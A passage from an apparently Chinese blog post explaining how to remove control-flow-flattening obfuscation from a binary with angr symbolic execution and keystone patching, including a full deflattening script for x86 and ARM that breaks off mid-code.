class="params">state</span>):</span><br><span class="line">            expressions = <span class="built_in">list</span>(state.scratch.irsb.statements[state.inspect.statement].expressions)</span><br><span class="line">            <span class="keyword">if</span> expressions <span class="keyword">and</span> <span class="built_in">isinstance</span>(expressions[<span class="number">0</span>], pyvex.expr.ITE):</span><br><span class="line">                state.scratch.temps[expressions[<span class="number">0</span>].cond.tmp] = cond</span><br><span class="line">                state.inspect._breakpoints[<span class="string">&#x27;statement&#x27;</span>] = []</span><br><span class="line">        state = proj.factory.blank_state(addr=node.addr, remove_options=&#123;angr.sim_options.LAZY_SOLVES&#125;)</span><br><span class="line">        state.inspect.b(<span class="string">&#x27;statement&#x27;</span>, when=angr.BP_BEFORE, action=apply_branch)</span><br><span class="line">        simgr = proj.factory.simulation_manager(state)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            simgr.step()</span><br><span class="line">            <span class="keyword">if</span> simgr.active[<span class="number">0</span>].addr <span class="keyword">in</span> targets:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> simgr.active[<span class="number">0</span>].addr</span><br><span class="line"></span><br><span class="line">new_cfg = nx.DiGraph()</span><br><span class="line">new_cfg.add_node(blocks[<span class="string">&#x27;relevant&#x27;</span>][<span class="number">0</span>])</span><br><span class="line">relevant_addrs = [node.addr <span class="keyword">for</span> node <span class="keyword">in</span> blocks[<span class="string">&#x27;relevant&#x27;</span>][<span class="number">1</span>:]]</span><br><span class="line">all_branches = &#123;&#125;</span><br><span class="line"><span class="comment"># Get the first real block of the function</span></span><br><span class="line">end = Get_successors(blocks[<span class="string">&#x27;relevant&#x27;</span>][<span class="number">0</span>], relevant_addrs)</span><br><span class="line">end = blocks[<span class="string">&#x27;relevant&#x27;</span>][relevant_addrs.index(end) + <span class="number">1</span>]</span><br><span class="line">new_cfg.add_edge(blocks[<span class="string">&#x27;relevant&#x27;</span>][<span class="number">0</span>], end)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    nodes = [node <span class="keyword">for</span> node <span class="keyword">in</span> new_cfg.nodes() <span class="keyword">if</span> new_cfg.out_degree(node) == <span class="number">0</span> <span class="keyword">and</span> node != blocks[<span class="string">&#x27;exit&#x27;</span>]]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> nodes:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> nodes:</span><br><span class="line">        <span class="comment"># Record each branch in relevant block. If there&#x27;s a branch, decide the operate after cmp(jz/jnz)</span></span><br><span class="line">        Get_branch(node.addr, all_branches, blocks[<span class="string">&#x27;pre_dispatcher&#x27;</span>].addr)</span><br><span class="line">        <span class="keyword">if</span> all_branches[node.addr][<span class="number">0</span>] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            end = Get_successors(node, relevant_addrs)</span><br><span class="line">            end = blocks[<span class="string">&#x27;relevant&#x27;</span>][relevant_addrs.index(end) + <span class="number">1</span>]</span><br><span class="line">            new_cfg.add_edge(node, end)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end_true  = Get_successors(node, relevant_addrs, all_branches[node.addr][<span class="number">0</span>], claripy.BVV(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">            end_false = Get_successors(node, relevant_addrs, all_branches[node.addr][<span class="number">0</span>], claripy.BVV(<span class="number">0</span>, <span class="number">1</span>))</span><br><span class="line">            end_true, end_false = blocks[<span class="string">&#x27;relevant&#x27;</span>][relevant_addrs.index(end_true) + <span class="number">1</span>], blocks[<span class="string">&#x27;relevant&#x27;</span>][relevant_addrs.index(end_false) + <span class="number">1</span>]</span><br><span class="line">            new_cfg.add_edges_from([(node, end_true), (node, end_false)])</span><br></pre></td></tr></table></figure>

<p>简单来说就是<code>cmovxx</code>的指令转化为vexcode时必定会产生<code>v3 = ITE(cond, v1, v2)</code>指令 通过更改cond就能达到上面的尝试的目的 同时分析的过程中打印出vex IR也能注意到 当原本的指令为<code>cmovx v1, v2</code>时 对应的vex IR总为<code>v1 = ITE(cond, v1, v2)</code> 相反 如果原来指令是<code>cmovnx</code> 那么vex IR就会是<code>v1 = ITE(cond, v2, v1)</code> 也就是说当设置cond为1时 执行的就是符号位满足执行mov指令的条件 那么当cond为1时<code>cmovxx</code>就完美对应了<code>jxx</code></p>
<h3 id="patch程序"><a href="#patch程序" class="headerlink" title="patch程序"></a>patch程序</h3><p>上面已经完成了所有困难的任务了 接下来要做的就是根据重建的控制流图来patch程序 这里将所有的无用块都patch成<code>nop</code>以方便后续对某些无用块的利用 同时对有分支的真实块在<code>cmovxx</code>处开始patch 那么剩余的真实块也需要patch成<code>nop</code>以防指令识别错误:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(args.path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    origin = <span class="built_in">bytearray</span>(f.read())</span><br><span class="line">    base = proj.loader.main_object.min_addr</span><br><span class="line">    arch = proj.arch.name</span><br><span class="line">    <span class="keyword">if</span> arch == <span class="string">&#x27;AMD64&#x27;</span>:</span><br><span class="line">        ks = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_64)</span><br><span class="line">    <span class="comment"># Fill all the irrelevant blocks with NOP</span></span><br><span class="line">        <span class="keyword">for</span> node <span class="keyword">in</span> blocks[<span class="string">&#x27;irrelevant&#x27;</span>] + [blocks[<span class="string">&#x27;pre_dispatcher&#x27;</span>]] + [blocks[<span class="string">&#x27;main_dispatcher&#x27;</span>]]:</span><br><span class="line">            origin[node.addr - base:node.addr - base + node.size] = ks.asm(<span class="string">&#x27;nop&#x27;</span>)[<span class="number">0</span>] * node.size</span><br><span class="line">    <span class="comment"># Redirect the entry block to the first relevant block</span></span><br><span class="line">        node = blocks[<span class="string">&#x27;main_dispatcher&#x27;</span>]</span><br><span class="line">        first_relevant = <span class="built_in">list</span>(new_cfg.successors([node <span class="keyword">for</span> node <span class="keyword">in</span> new_cfg.nodes() <span class="keyword">if</span> new_cfg.in_degree(node) == <span class="number">0</span>][<span class="number">0</span>]))[<span class="number">0</span>]</span><br><span class="line">        new_opcode = ks.asm(<span class="string">f&#x27;jmp <span class="subst">&#123;<span class="built_in">hex</span>(first_relevant.addr)&#125;</span>&#x27;</span>, node.addr)[<span class="number">0</span>]</span><br><span class="line">        origin[node.addr - base:node.addr - base + <span class="built_in">len</span>(new_opcode)] = new_opcode</span><br><span class="line">    <span class="comment"># Rebuild the network between nodes</span></span><br><span class="line">        nodes = [node <span class="keyword">for</span> node <span class="keyword">in</span> new_cfg <span class="keyword">if</span> new_cfg.in_degree(node) <span class="keyword">and</span> new_cfg.out_degree(node)]</span><br><span class="line">        <span class="keyword">for</span> node <span class="keyword">in</span> nodes:</span><br><span class="line">            follows = <span class="built_in">list</span>(new_cfg.successors(node))</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(follows) == <span class="number">1</span>:</span><br><span class="line">                patch_addr = all_branches[node.addr][<span class="number">2</span>]</span><br><span class="line">                new_opcode = ks.asm(<span class="string">f&#x27;jmp <span class="subst">&#123;<span class="built_in">hex</span>(follows[<span class="number">0</span>].addr)&#125;</span>&#x27;</span>, patch_addr)[<span class="number">0</span>]</span><br><span class="line">                origin[patch_addr - base:patch_addr - base + <span class="built_in">len</span>(new_opcode)] = new_opcode</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                patch_addr = all_branches[node.addr][<span class="number">0</span>]</span><br><span class="line">                end_addr   = all_branches[node.addr][<span class="number">2</span>]</span><br><span class="line">                <span class="comment"># Fill the rest of the block with NOP</span></span><br><span class="line">                origin[patch_addr - base:end_addr - base] = ks.asm(<span class="string">&#x27;nop&#x27;</span>)[<span class="number">0</span>] * (end_addr - patch_addr)</span><br><span class="line">                f1, f2 = follows[<span class="number">0</span>], follows[<span class="number">1</span>]</span><br><span class="line">                op1 = x86_64_book[all_branches[node.addr][<span class="number">1</span>]] + <span class="string">&#x27; &#x27;</span> + <span class="built_in">hex</span>(f1.addr)</span><br><span class="line">                new_opcode1 = ks.asm(op1, patch_addr)[<span class="number">0</span>]</span><br><span class="line">                op2 = <span class="string">&#x27;jmp &#x27;</span> + <span class="built_in">hex</span>(f2.addr)</span><br><span class="line">                new_opcode2 = ks.asm(op2, patch_addr + <span class="built_in">len</span>(new_opcode1))[<span class="number">0</span>]</span><br><span class="line">                origin[patch_addr - base:patch_addr - base + <span class="built_in">len</span>(new_opcode1 + new_opcode2)] = new_opcode1 + new_opcode2</span><br><span class="line">    <span class="comment"># Write the patched program</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(args.output, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f_:</span><br><span class="line">        f_.write(<span class="built_in">bytes</span>(origin))</span><br></pre></td></tr></table></figure>

<p>这里还要提出 将真实块添加到<code>new_cfg</code>中时是以 先加入cond &#x3D; 1到达的下一个真实块后加入cond &#x3D; 0到达的下一个真实块的顺序加入的 这个脚本能成功运行基于networkx对加入顺序的记忆性 当用<code>.successors()</code>方法取出时会按同样的顺序取出</p>
<h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, logging, pyvex, claripy, binascii, argparse</span><br><span class="line"><span class="keyword">import</span> networkx <span class="keyword">as</span> nx</span><br><span class="line"><span class="keyword">import</span> keystone <span class="keyword">as</span> ks</span><br><span class="line"><span class="keyword">from</span> angrmanagement.utils <span class="keyword">import</span> graph</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;Deflat the program&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--path&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;The path to input program&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-a&#x27;</span>, <span class="string">&#x27;--addr&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;The address of the function you want to deflat, if not given, deflat main&#x27;</span>, required=<span class="literal">False</span>, default=<span class="string">&#x27;main&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--output&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;The name of output program&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-g&#x27;</span>, <span class="string">&#x27;--graph&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Draw the graph of the CFG after deflated, off as default&#x27;</span>, required=<span class="literal">False</span>, action=<span class="string">&#x27;store_true&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-v&#x27;</span>, <span class="string">&#x27;--vex&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Print the vex code of the relevant block, off as default&#x27;</span>, required=<span class="literal">False</span>, action=<span class="string">&#x27;store_true&#x27;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">logging.getLogger(<span class="string">&#x27;angr&#x27;</span>).setLevel(<span class="string">&#x27;ERROR&#x27;</span>)</span><br><span class="line">proj = angr.Project(args.path, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">x86_64_book = &#123;<span class="string">&#x27;cmovz&#x27;</span> : <span class="string">&#x27;jz&#x27;</span>, <span class="string">&#x27;cmove&#x27;</span> : <span class="string">&#x27;jz&#x27;</span>, <span class="string">&#x27;cmovnz&#x27;</span> : <span class="string">&#x27;jnz&#x27;</span>, <span class="string">&#x27;cmovne&#x27;</span> : <span class="string">&#x27;jnz&#x27;</span>, <span class="string">&#x27;cmovg&#x27;</span> : <span class="string">&#x27;jg&#x27;</span>, <span class="string">&#x27;cmovl&#x27;</span> : <span class="string">&#x27;jl&#x27;</span>, <span class="string">&#x27;cmovge&#x27;</span> : <span class="string">&#x27;jge&#x27;</span>, <span class="string">&#x27;cmovle&#x27;</span> : <span class="string">&#x27;jle&#x27;</span>, <span class="string">&#x27;jmp&#x27;</span> : <span class="string">&#x27;jmp&#x27;</span>, <span class="string">&#x27;call&#x27;</span> : <span class="string">&#x27;call&#x27;</span>, <span class="string">&#x27;nop&#x27;</span> : <span class="string">&#x27;nop&#x27;</span>, <span class="string">&#x27;ret&#x27;</span> : [[<span class="string">&#x27;ret&#x27;</span>, <span class="string">&#x27;retn&#x27;</span>], <span class="string">&#x27;&#x27;</span>], <span class="string">&#x27;name&#x27;</span> : <span class="string">&#x27;x86_64&#x27;</span>&#125;</span><br><span class="line">arm_book = &#123;<span class="string">&#x27;moveq&#x27;</span> : <span class="string">&#x27;beq&#x27;</span>, <span class="string">&#x27;movne&#x27;</span> : <span class="string">&#x27;bne&#x27;</span>, <span class="string">&#x27;movgt&#x27;</span> : <span class="string">&#x27;bgt&#x27;</span>, <span class="string">&#x27;movlt&#x27;</span> : <span class="string">&#x27;blt&#x27;</span>, <span class="string">&#x27;movge&#x27;</span> : <span class="string">&#x27;bge&#x27;</span>, <span class="string">&#x27;movle&#x27;</span> : <span class="string">&#x27;ble&#x27;</span>, <span class="string">&#x27;jmp&#x27;</span> : <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;call&#x27;</span> : <span class="string">&#x27;bl&#x27;</span>, <span class="string">&#x27;nop&#x27;</span> : <span class="string">&#x27;nop&#x27;</span>, <span class="string">&#x27;ret&#x27;</span> : [[<span class="string">&#x27;bx&#x27;</span>], <span class="string">&#x27;lr&#x27;</span>], <span class="string">&#x27;name&#x27;</span> : <span class="string">&#x27;arm&#x27;</span>&#125;</span><br><span class="line">Ins_book = &#123;<span class="string">&#x27;AMD64&#x27;</span> : x86_64_book, <span class="string">&#x27;ARMEL&#x27;</span> : arm_book, <span class="string">&#x27;X86&#x27;</span> : x86_64_book&#125;</span><br><span class="line">KSS = &#123;<span class="string">&#x27;AMD64&#x27;</span> : ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_64), <span class="string">&#x27;ARMEL&#x27;</span> : ks.Ks(ks.KS_ARCH_ARM, ks.KS_MODE_ARM), <span class="string">&#x27;X86&#x27;</span> : ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)&#125;</span><br><span class="line">book = Ins_book[proj.arch.name]</span><br><span class="line">ks = KSS[proj.arch.name]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_CFG</span>(<span class="params">proj : angr.Project</span>):</span><br><span class="line">    cfg = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cfg = proj.analyses.CFGFast(normalize=<span class="literal">True</span>, force_complete_scan=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        cfg = proj.analyses.CFGFast(normalize=<span class="literal">True</span>)</span><br><span class="line">    addr = <span class="built_in">int</span>(args.addr, <span class="number">16</span>) <span class="keyword">if</span> args.addr != <span class="string">&#x27;main&#x27;</span> <span class="keyword">else</span> args.addr</span><br><span class="line">    cfg = cfg.functions[addr].transition_graph</span><br><span class="line">    IDA_cfg = graph.to_supergraph(cfg) </span><br><span class="line">    <span class="keyword">return</span> IDA_cfg</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_Blocks</span>(<span class="params">cfg</span>) -&gt; <span class="built_in">dict</span>:</span><br><span class="line">    blocks = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> cfg.nodes():</span><br><span class="line">        <span class="keyword">if</span> cfg.in_degree(node) == <span class="number">0</span>:</span><br><span class="line">            blocks[<span class="string">&#x27;entry&#x27;</span>] = node</span><br><span class="line">        <span class="keyword">elif</span> cfg.out_degree(node) == <span class="number">0</span>:</span><br><span class="line">            blocks[<span class="string">&#x27;exit&#x27;</span>] = node</span><br><span class="line">    blocks[<span class="string">&#x27;main_dispatcher&#x27;</span>] = <span class="built_in">list</span>(cfg.successors(blocks[<span class="string">&#x27;entry&#x27;</span>]))[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> cfg.predecessors(blocks[<span class="string">&#x27;main_dispatcher&#x27;</span>]):</span><br><span class="line">        <span class="keyword">if</span> cfg.in_degree(node) != <span class="number">0</span>:</span><br><span class="line">            blocks[<span class="string">&#x27;pre_dispatcher&#x27;</span>] = node</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    blocks[<span class="string">&#x27;relevant&#x27;</span>] = [blocks[<span class="string">&#x27;entry&#x27;</span>]] + [node <span class="keyword">for</span> node <span class="keyword">in</span> cfg.predecessors(blocks[<span class="string">&#x27;pre_dispatcher&#x27;</span>]) <span class="keyword">if</span> cfg.in_degree(node) == <span class="number">1</span>] + [blocks[<span class="string">&#x27;exit&#x27;</span>]]</span><br><span class="line">    blocks[<span class="string">&#x27;irrelevant&#x27;</span>] = [node <span class="keyword">for</span> node <span class="keyword">in</span> cfg.nodes() <span class="keyword">if</span> node <span class="keyword">not</span> <span class="keyword">in</span> blocks[<span class="string">&#x27;relevant&#x27;</span>] <span class="keyword">and</span> node != blocks[<span class="string">&#x27;main_dispatcher&#x27;</span>] <span class="keyword">and</span> node != blocks[<span class="string">&#x27;pre_dispatcher&#x27;</span>]]</span><br><span class="line">    <span class="keyword">return</span> blocks</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_branch</span>(<span class="params">block_addr, all_branches, target, _<span class="keyword">from</span>=<span class="literal">None</span>, flag=<span class="literal">False</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="comment"># This function is used to get the address where the branch is located with it&#x27;s type and the address of the end of the block</span></span><br><span class="line">    <span class="keyword">if</span> _<span class="keyword">from</span> <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        _<span class="keyword">from</span> = block_addr</span><br><span class="line">        all_branches[_<span class="keyword">from</span>] = [<span class="literal">None</span>, <span class="literal">None</span>]</span><br><span class="line">    block = proj.factory.block(block_addr)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">NOP</span>(<span class="params">state</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    block_ins = block.capstone.insns</span><br><span class="line">    <span class="keyword">for</span> ins <span class="keyword">in</span> block_ins:</span><br><span class="line">        <span class="keyword">if</span> ins.mnemonic == book[<span class="string">&#x27;call&#x27;</span>]:</span><br><span class="line">            <span class="comment"># Hook all calls to avoid errors in the CFG(too deep recursion)</span></span><br><span class="line">            proj.hook(ins.address, hook=NOP, length=ins.size)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;hooked <span class="subst">&#123;<span class="built_in">hex</span>(ins.address)&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> ins.mnemonic.startswith(<span class="string">&#x27;cmov&#x27;</span>) <span class="keyword">or</span> (ins.mnemonic.startswith(<span class="string">&#x27;mov&#x27;</span>) <span class="keyword">and</span> <span class="built_in">len</span>(ins.mnemonic) &gt; <span class="number">3</span> <span class="keyword">and</span> book[<span class="string">&#x27;name&#x27;</span>] == <span class="string">&#x27;arm&#x27;</span>):</span><br><span class="line">            all_branches[_<span class="keyword">from</span>][<span class="number">0</span>], all_branches[_<span class="keyword">from</span>][<span class="number">1</span>] = ins.address, ins.mnemonic</span><br><span class="line">            flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> ins.mnemonic == book[<span class="string">&#x27;jmp&#x27;</span>] <span class="keyword">or</span> (ins.mnemonic <span class="keyword">in</span> book[<span class="string">&#x27;ret&#x27;</span>][<span class="number">0</span>] <span class="keyword">and</span> ins.op_str == book[<span class="string">&#x27;ret&#x27;</span>][<span class="number">1</span>]):</span><br><span class="line">        all_branches[_<span class="keyword">from</span>].append(ins.address)</span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> Get_branch(ins.address + ins.size, all_branches, target, _<span class="keyword">from</span>, flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_successors</span>(<span class="params">node, targets : <span class="built_in">list</span>, branch_sign=<span class="literal">None</span>, cond=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> branch_sign <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        state = proj.factory.blank_state(addr=node.addr, remove_options=&#123;angr.sim_options.LAZY_SOLVES&#125;)</span><br><span class="line">        simgr = proj.factory.simulation_manager(state)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            simgr.step()</span><br><span class="line">            <span class="keyword">if</span> simgr.active[<span class="number">0</span>].addr <span class="keyword">in</span> targets:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> simgr.active[<span class="number">0</span>].addr</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">apply_branch</span>(<span class="params">state</span>):</span><br><span class="line">            expressions = <span class="built_in">list</span>(state.scratch.irsb.statements[state.inspect.statement].expressions)</span><br><span class="line">            <span class="keyword">if</span> expressions <span class="keyword">and</span> <span class="built_in">isinstance</span>(expressions[<span class="number">0</span>], pyvex.expr.ITE):</span><br><span class="line">                <span class="keyword">if</span> args.vex:</span><br><span class="line">                    <span class="comment"># ========Inspec of vexcode========</span></span><br><span class="line">                    block = proj.factory.block(node.addr)</span><br><span class="line">                    <span class="built_in">print</span>(block.vex.pp())</span><br><span class="line">                    <span class="comment"># ========Inspec of vexcode========</span></span><br><span class="line">                state.scratch.temps[expressions[<span class="number">0</span>].cond.tmp] = cond</span><br><span class="line">                state.inspect._breakpoints[<span class="string">&#x27;statement&#x27;</span>] = []</span><br><span class="line">        state = proj.factory.blank_state(addr=node.addr, remove_options=&#123;angr.sim_options.LAZY_SOLVES&#125;)</span><br><span class="line">        state.inspect.b(<span class="string">&#x27;statement&#x27;</span>, when=angr.BP_BEFORE, action=apply_branch)</span><br><span class="line">        simgr = proj.factory.simulation_manager(state)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            simgr.step()</span><br><span class="line">            <span class="keyword">if</span> simgr.active[<span class="number">0</span>].addr <span class="keyword">in</span> targets:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> simgr.active[<span class="number">0</span>].addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="comment"># Get the cfg of a function, if passed a function address, get the cfg of that function, default is main:</span></span><br><span class="line">    cfg = Get_CFG(proj)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get each kind of block:</span></span><br><span class="line">    blocks = Get_Blocks(cfg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Rebuild the cfg:</span></span><br><span class="line">    new_cfg = nx.DiGraph()</span><br><span class="line">    new_cfg.add_node(blocks[<span class="string">&#x27;relevant&#x27;</span>][<span class="number">0</span>])</span><br><span class="line">    relevant_addrs = [node.addr <span class="keyword">for</span> node <span class="keyword">in</span> blocks[<span class="string">&#x27;relevant&#x27;</span>][<span class="number">1</span>:]]</span><br><span class="line">    all_branches = &#123;&#125;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Entry: <span class="subst">&#123;<span class="built_in">hex</span>(blocks[<span class="string">&quot;entry&quot;</span>].addr)&#125;</span>\nExit: <span class="subst">&#123;<span class="built_in">hex</span>(blocks[<span class="string">&quot;exit&quot;</span>].addr)&#125;</span>\nMain Dispatcher: <span class="subst">&#123;<span class="built_in">hex</span>(blocks[<span class="string">&quot;main_dispatcher&quot;</span>].addr)&#125;</span>\nPre Dispatcher: <span class="subst">&#123;<span class="built_in">hex</span>(blocks[<span class="string">&quot;pre_dispatcher&quot;</span>].addr)&#125;</span>\nRelevant: <span class="subst">&#123;[<span class="built_in">hex</span>(node.addr) <span class="keyword">for</span> node <span class="keyword">in</span> blocks[<span class="string">&quot;relevant&quot;</span>]]&#125;</span>\nIrrelevant: <span class="subst">&#123;[<span class="built_in">hex</span>(node.addr) <span class="keyword">for</span> node <span class="keyword">in</span> blocks[<span class="string">&quot;irrelevant&quot;</span>]]&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">input</span>(<span class="string">&#x27;...&#x27;</span>)</span><br><span class="line">    <span class="comment"># Get the first real block of the function</span></span><br><span class="line">    end = Get_successors(blocks[<span class="string">&#x27;relevant&#x27;</span>][<span class="number">0</span>], relevant_addrs)</span><br><span class="line">    end = blocks[<span class="string">&#x27;relevant&#x27;</span>][relevant_addrs.index(end) + <span class="number">1</span>]</span><br><span class="line">    new_cfg.add_edge(blocks[<span class="string">&#x27;relevant&#x27;</span>][<span class="number">0</span>], end)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        nodes = [node <span class="keyword">for</span> node <span class="keyword">in</span> new_cfg.nodes() <span class="keyword">if</span> new_cfg.out_degree(node) == <span class="number">0</span> <span class="keyword">and</span> node != blocks[<span class="string">&#x27;exit&#x27;</span>]]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> nodes:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> node <span class="keyword">in</span> nodes:</span><br><span class="line">            <span class="comment"># Record each branch in relevant block. If there&#x27;s a branch, decide the operate after cmp(jz/jnz)</span></span><br><span class="line">            Get_branch(node.addr, all_branches, blocks[<span class="string">&#x27;pre_dispatcher&#x27;</span>].addr)</span><br><span class="line">            <span class="keyword">for</span> branch <span class="keyword">in</span> all_branches:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">hex</span>(branch)&#125;</span> : <span class="subst">&#123;all_branches[branch]&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> all_branches[node.addr][<span class="number">0</span>] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                end = Get_successors(node, relevant_addrs)</span><br><span class="line">                end = blocks[<span class="string">&#x27;relevant&#x27;</span>][relevant_addrs.index(end) + <span class="number">1</span>]</span><br><span class="line">                new_cfg.add_edge(node, end)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end_true  = Get_successors(node, relevant_addrs, all_branches[node.addr][<span class="number">0</span>], claripy.BVV(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">                end_false = Get_successors(node, relevant_addrs, all_branches[node.addr][<span class="number">0</span>], claripy.BVV(<span class="number">0</span>, <span class="number">1</span>))</span><br><span class="line">                end_true, end_false = blocks[<span class="string">&#x27;relevant&#x27;</span>][relevant_addrs.index(end_true) + <span class="number">1</span>], blocks[<span class="string">&#x27;relevant&#x27;</span>][relevant_addrs.index(end_false) + <span class="number">1</span>]</span><br><span class="line">                new_cfg.add_edges_from([(node, end_true), (node, end_false)])</span><br><span class="line">    <span class="keyword">if</span> args.graph:</span><br><span class="line">        <span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line">        <span class="comment"># ========Draw the new cfg========</span></span><br><span class="line">        nx.draw(new_cfg, with_labels=<span class="literal">True</span>)</span><br><span class="line">        plt.show()</span><br><span class="line">        <span class="comment"># ========Draw the new cfg========</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Patch the origin program:</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(args.path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        origin = <span class="built_in">bytearray</span>(f.read())</span><br><span class="line">        base = proj.loader.main_object.mapped_base</span><br><span class="line">    <span class="comment"># Fill all the irrelevant blocks with NOP</span></span><br><span class="line">        <span class="keyword">for</span> node <span class="keyword">in</span> blocks[<span class="string">&#x27;irrelevant&#x27;</span>] + [blocks[<span class="string">&#x27;pre_dispatcher&#x27;</span>]] + [blocks[<span class="string">&#x27;main_dispatcher&#x27;</span>]]:</span><br><span class="line">            origin[node.addr - base:node.addr - base + node.size] = ks.asm(<span class="string">&#x27;nop&#x27;</span>)[<span class="number">0</span>] * (node.size // <span class="built_in">len</span>(ks.asm(<span class="string">&#x27;nop&#x27;</span>)[<span class="number">0</span>]))</span><br><span class="line">    <span class="comment"># Redirect the entry block to the first relevant block</span></span><br><span class="line">        node = blocks[<span class="string">&#x27;main_dispatcher&#x27;</span>]</span><br><span class="line">        first_relevant = <span class="built_in">list</span>(new_cfg.successors([node <span class="keyword">for</span> node <span class="keyword">in</span> new_cfg.nodes() <span class="keyword">if</span> new_cfg.in_degree(node) == <span class="number">0</span>][<span class="number">0</span>]))[<span class="number">0</span>]</span><br><span class="line">        new_opcode = ks.asm(book[<span class="string">&#x27;jmp&#x27;</span>] + <span class="string">&#x27; &#x27;</span> + <span class="built_in">hex</span>(first_relevant.addr), node.addr)[<span class="number">0</span>]</span><br><span class="line">        origin[node.addr - base:node.addr - base + <span class="built_in">len</span>(new_opcode)] = new_opcode</span><br><span class="line">    <span class="comment"># Rebuild the network between nodes</span></span><br><span class="line">        nodes = [node <span class="keyword">for</span> node <span class="keyword">in</span> new_cfg <span class="keyword">if</span> 